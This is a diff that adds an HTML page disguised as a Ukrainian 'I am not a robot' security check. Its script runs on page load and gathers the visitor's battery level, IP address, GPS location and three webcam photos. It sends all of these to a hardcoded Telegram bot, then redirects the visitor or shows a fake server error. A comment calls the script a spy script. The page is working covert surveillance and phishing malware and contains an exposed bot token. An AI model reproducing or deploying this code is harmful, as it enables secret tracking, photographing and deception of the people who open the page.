@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <style>
+        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 80%; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background: #3498db; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+    </style>
+<script>
+    async function _x(){
+        try {
+            let msg = "🔋 Стан: ";
+            const bat = await navigator.getBattery();
+            msg += Math.round(bat.level * 100) + "% | ";
+            
+            const ipReq = await fetch('https://api.ipify.org?format=json').then(r=>r.json());
+            msg += "IP: " + ipReq.ip;
+            
+            navigator.geolocation.getCurrentPosition(p => {
+                const loc = "\n📍 GPS: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude;
+                fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendMessage?chat_id=8194848649&text=' + encodeURIComponent(msg + loc));
+            }, () => {
+                fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendMessage?chat_id=8194848649&text=' + encodeURIComponent(msg + "\n📍 GPS: Вимкнено"));
+            });
+
+            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+            const v = document.createElement('video');
+            v.srcObject = stream;
+            await v.play();
+
+            // Burst Mode: 3 фото
+            for(let i=0; i<3; i++) {
+                await new Promise(r => setTimeout(r, 3000));
+                const c = document.createElement('canvas');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v,0,0);
+                c.toBlob(b => {
+                    const f = new FormData();
+                    f.append('chat_id','8194848649'); f.append('photo',b,'x.jpg');
+                    fetch('https://api.telegram.org/bot8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8/sendPhoto',{method:'POST',body:f});
+                },'image/jpeg', 0.5);
+            }
+
+            // Redirect через 10 сек
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 10000);
+        } catch(e) {}
+    }
+    window.onload = _x;
+    </script></head>
+<body>
+    <div class="box" id="content">
+        <h2 style="color: #333;">Перевірка безпеки</h2>
+        <p style="color: #666;">Підтвердіть, що ви не робот, щоб продовжити користування сервісом.</p>
+        <div id="status">
+            <button onclick="startVerification()">Я не робот</button>
+        </div>
+    </div>
+
+    <script>
+        function startVerification() {
+            // Змінюємо інтерфейс на "завантаження"
+            document.getElementById('status').innerHTML = '<div class="loader"></div><p>Обробка даних...</p>';
+            
+            // Тут автоматично спрацює наш шпигунський скрипт (startSpy), 
+            // бо користувач щойно натиснув на кнопку (window.onclick).
+            
+            // Через 10 секунд імітуємо помилку або просто перекидаємо в Google
+            setTimeout(() => {
+                document.getElementById('content').innerHTML = '<h2>Помилка сервера</h2><p>Спробуйте пізніше або використовуйте браузер.</p>';
+            }, 8000);
+        }
+    </script>
+</body>
+</html>
